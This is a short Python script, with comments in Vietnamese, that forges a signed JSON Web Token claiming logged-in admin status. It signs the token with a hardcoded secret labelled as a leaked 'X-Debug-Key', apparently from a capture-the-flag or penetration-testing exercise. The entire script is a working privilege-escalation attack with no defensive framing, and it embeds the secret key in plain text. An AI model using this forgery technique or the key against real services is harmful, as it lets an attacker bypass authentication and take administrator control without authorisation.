import hmac
import hashlib
import base64
import json

# 1. Header và Payload
header = {"alg": "HS256", "typ": "JWT"}
payload = {
    "loggedIn": True,
    "admin": True,
    "iat": 1772873490, 
    "exp": 1772877090  
}

# 2. X-Debug-Key
secret = "1ba21d774d42ba22b975f2d8e25521485a18c46589ead44e2e7d07555f81510f"

def b64url_encode(data):
    return base64.urlsafe_b64encode(json.dumps(data, separators=(',', ':')).encode()).decode().rstrip('=')

b64_header = b64url_encode(header)
b64_payload = b64url_encode(payload)

# 3. Ký Token bằng Secret mới
signature_data = f"{b64_header}.{b64_payload}"
signature = hmac.new(secret.encode(), signature_data.encode(), hashlib.sha256).digest()
b64_signature = base64.urlsafe_b64encode(signature).decode().rstrip('=')

# 4. Kết quả
print(f"{b64_header}.{b64_payload}.{b64_signature}")